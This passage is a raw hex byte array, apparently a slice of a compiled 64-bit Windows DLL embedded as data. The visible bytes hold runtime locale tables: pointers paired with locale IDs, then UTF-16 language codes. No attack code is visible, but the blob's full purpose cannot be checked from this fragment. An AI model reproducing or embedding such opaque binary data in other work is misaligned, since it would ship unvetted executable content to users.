0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x10, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x11, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x12, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x13, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x14, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x15, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x16, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x18, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x19, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1b, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1e, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1f, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x21, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x22, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x23, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x24, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x25, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x26, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x27, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x29, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2a, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2b, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2c, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2d, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2f, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x32, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x34, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x35, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x36, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x2c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x37, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x38, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x39, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3a, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3b, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3e, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3f, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x40, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x41, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x43, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x44, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x45, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x46, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x47, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x49, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x2d, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4a, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4b, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4e, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4f, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x52, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x56, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x57, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5a, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x65, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6b, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6c, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x81, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x2e, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x10, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x13, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x14, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x16, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2c, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3b, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3e, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x43, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6b, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x2f, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3b, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x30, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3b, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3b, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3b, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x31, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3b, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3b, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3b, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x28, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x28, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x28, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x32, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x2c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x2c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x2c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x34, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x34, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x34, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x38, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x38, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x44, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x33, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x48, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x34, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x4c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x34, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x50, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x34, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0x7c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x34, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x7c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x34, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x62, 0x0, 0x67, 0x0, 0x0, 0x0, 0x0, 0x0, 0x63, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x43, 0x0, 0x48, 0x0, 0x53, 0x0, 0x0, 0x0, 0x0, 0x0, 0x63, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x69, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x69, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6a, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x0, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x6b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x71, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x76, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x0, 0x68, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x75, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x69, 0x0, 0x64, 0x0, 0x0, 0x0, 0x0, 0x0, 0x75, 0x0, 0x6b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x62, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6c, 0x0, 0x76, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6c, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x6b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x66, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x6b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x77, 0x0, 0x0, 0x0, 0x0, 0x0, 0x75, 0x0, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x67, 0x0, 0x75, 0x0, 